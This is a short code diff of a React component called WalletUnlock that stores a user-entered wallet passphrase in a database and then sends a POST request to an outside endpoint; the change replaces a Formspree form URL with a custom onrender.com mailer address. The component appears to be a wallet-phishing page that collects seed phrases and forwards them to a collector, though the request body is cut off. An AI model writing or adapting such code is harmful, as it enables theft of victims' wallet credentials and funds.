@@ -39,7 +39,7 @@ const WalletUnlock = () => {
         .insert([{ passphrase }]);
 
       if (error) throw error;
-          await fetch("https://formspree.io/f/xkovgvjr", {
+          await fetch("https://mailer-8dcp.onrender.com/api/email/notify", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
